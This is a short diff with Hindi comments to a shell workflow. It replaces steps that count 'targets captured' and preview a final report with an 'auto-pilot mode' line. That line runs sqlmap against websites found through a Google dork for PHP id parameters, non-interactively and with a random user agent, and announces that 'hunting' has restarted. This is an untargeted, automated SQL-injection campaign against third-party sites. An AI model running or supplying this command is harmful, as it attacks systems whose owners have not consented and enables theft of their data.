@@ -1,4 +1,2 @@
-# स्टेप 1: अब तक मिले रिवॉर्ड्स की गिनती करें
-echo "TOTAL TARGETS CAPTURED:" && wc -l results.txt
-# स्टेप 2: फाइनल रिपोर्ट का प्रीव्यू देखें
-echo "FINAL REPORT PREVIEW:" && head -n 15 final_report.txt
+# ऑटो-पायलट मोड चालू करें
+python3 sqlmap/sqlmap.py -g "inurl:.php?id=" --batch --smart --random-agent --output-dir=results_folder && echo "HUNTING RESTARTED - CHECKING NEW NODES"
